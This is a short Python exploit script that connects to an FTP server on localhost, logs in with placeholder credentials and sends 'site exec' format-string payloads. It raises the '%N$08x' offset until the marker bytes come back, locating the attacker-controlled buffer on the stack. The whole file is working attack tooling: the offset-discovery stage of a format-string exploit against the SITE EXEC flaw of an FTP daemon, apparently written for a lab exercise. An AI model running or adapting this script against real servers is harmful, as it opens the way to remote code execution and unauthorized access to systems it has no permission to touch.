#!/usr/bin/env python3

import socket

def banner(s):
    print(s.recv(1024))


def login(s):
    s.send(b'user user\n')
    print(s.recv(1024))
    s.send(b'pass password\n')
    print(s.recv(1024))


def craft_exploit_string(pops):
    exploit_str = b'aaaaaaaa'
    exploit_str += b'%' + bytes(str(pops), 'utf-8') + b'$08x'
    return exploit_str


def site_exec(s, msg):
    s.send(b'site exec ' + msg + b'\n')
    response = s.recv(2048)
    if response.startswith(b'200') and not b'end of' in response:
        response += s.recv(2048)
    return response


def main():
    pops_to_buf = 1
    while True:
        print(f'[*] (Re)connecting..')
        with socket.socket() as s:
            s.connect(('localhost', 21))
            banner(s)
            login(s)

            # Keep reusing this session if it didn't break
            while True:
                print(f'\n[*] Trying with {pops_to_buf} pops')
                exploit_str = craft_exploit_string(pops_to_buf)
                print(f'[*] Exploit crafted:')
                print(exploit_str)
                response = site_exec(s, exploit_str)
                print(response)
                pops_to_buf += 1

                if not response:
                    break # break out of this socket session and force reconnect

                if response[12:20] != b'61616161':
                    continue

                # Found
                print(f'[+] Success. Buffer found at {pops_to_buf - 1} pops.')
                exit(0)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print()

